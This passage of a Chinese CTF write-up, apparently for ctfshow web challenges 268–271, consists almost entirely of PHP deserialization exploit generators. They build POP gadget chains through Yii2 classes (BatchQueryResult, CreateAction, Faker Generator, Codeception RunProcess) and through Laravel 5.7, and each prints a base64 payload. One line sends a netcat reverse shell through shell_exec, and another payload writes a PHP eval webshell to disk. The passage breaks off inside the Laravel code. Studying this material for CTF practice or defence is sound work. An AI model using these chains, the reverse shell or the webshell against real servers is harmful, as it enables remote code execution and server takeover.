data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRm1wLndlaXhpbi5xcS5jb20lMkZzJTNGX19iaXolM0RNelU1TURJME9ESTVNUSUzRCUzRCUyNm1pZCUzRDIyNDc0ODUxMjklMjZpZHglM0QxJTI2c24lM0RiMjdlM2ZlODQ1ZGFlZTJmYjEzYmI5ZjM2ZjUzYWI0MA==\">复现文章 2</span></p>\n<h1 id=\"web-268\"><a class=\"anchor\" href=\"#web-268\">#</a> web 268</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// 这里需要改为 isRunning</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'isRunning'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// poc2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Codeception<span class=\"token punctuation\">\\</span>Extension</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">RunProcess</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$processes</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">processes</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\">// 生成 poc</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\">Codeception<span class=\"token punctuation\">\\</span>Extension<span class=\"token punctuation\">\\</span>RunProcess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-269\"><a class=\"anchor\" href=\"#web-269\">#</a> web 269</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">CreateAction</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'phpinfo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Faker</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>CreateAction</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Generator</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$formatters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// 这里需要改为 isRunning</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">formatters</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'render'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">CreateAction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'run'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">phpDocumentor<span class=\"token punctuation\">\\</span>Reflection<span class=\"token punctuation\">\\</span>DocBlock<span class=\"token punctuation\">\\</span>Tags</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">Faker<span class=\"token punctuation\">\\</span>Generator</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">See</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$description</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">description</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Generator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">namespace</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">phpDocumentor<span class=\"token punctuation\">\\</span>Reflection<span class=\"token punctuation\">\\</span>DocBlock<span class=\"token punctuation\">\\</span>Tags<span class=\"token punctuation\">\\</span>See</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Swift_KeyCache_DiskKeyCache</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$keys</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">path</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">See</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">keys</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token string double-quoted-string\">\"axin\"</span><span class=\"token operator\">=&gt;</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"is\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"handsome\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token comment\">// 生成 poc</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Swift_KeyCache_DiskKeyCache</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-270\"><a class=\"anchor\" href=\"#web-270\">#</a> web 270</h1>\n<p>也可以反弹 shell</p>\n<p><code>$exp = new \\yii\\db\\BatchQueryResult('shell_exec', \"nc xx.xx.xx.xx port -e /bin/sh\");</code></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>rest</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Action</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$checkAccess</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexAction</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">checkAccess</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$func</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>web</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$writeCallback</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">DbSession</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">MultiFieldSession</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">writeCallback</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>rest<span class=\"token punctuation\">\\</span>IndexAction</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"run\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>db</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">use</span> <span class=\"token package\">yii<span class=\"token punctuation\">\\</span>base<span class=\"token punctuation\">\\</span>BaseObject</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">BatchQueryResult</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token variable\">$_dataReader</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">_dataReader</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>web<span class=\"token punctuation\">\\</span>DbSession</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$param</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$exp</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name class-name-fully-qualified\"><span class=\"token punctuation\">\\</span>yii<span class=\"token punctuation\">\\</span>db<span class=\"token punctuation\">\\</span>BatchQueryResult</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shell_exec'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"echo '&lt;?php eval(\\$_POST[1]); ?&gt;' &gt; 1.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$exp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><h1 id=\"web-271\"><a class=\"anchor\" href=\"#web-271\">#</a> web 271</h1>\n<p>laravel5.7 反序列化漏洞</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token package\">Illuminate<span class=\"token punctuation\">\\</span>Foundation<span class=\"token punctuation\">\\</span>Testing</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">PendingCommand</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token variable\">$test</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">protected</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$app</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$command</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$parameters</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 